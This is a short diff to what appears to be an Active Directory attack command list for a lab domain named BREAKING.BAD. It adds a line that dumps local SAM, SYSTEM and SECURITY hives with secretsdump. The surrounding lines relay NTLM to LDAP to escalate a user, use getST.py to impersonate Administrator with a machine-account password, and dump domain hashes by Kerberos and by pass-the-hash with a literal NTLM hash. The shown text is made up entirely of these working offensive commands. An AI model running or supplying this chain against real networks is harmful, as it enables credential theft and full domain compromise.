@@ -23,6 +23,7 @@ ntlmrelayx -t ldap://DC01.BREAKING.BAD -smb2support --escalate-user SHUTDOWN
 getST.py -spn host/DC02.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 BREAKING.BAD/'SHUTDOWN$':123soleil
 getST.py -spn host/SV01.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 BREAKING.BAD/'SHUTDOWN$':123soleil
 secretsdump -k DC02.BREAKING.BAD
+secretsdump -sam sam.save -system system.save -security security.save LOCAL
 secretsdump -k -outputfile BREAKING.BAD DC02.BREAKING.BAD
 secretsdump -outputfile BREAKING.BAD -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
 secretsdump -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
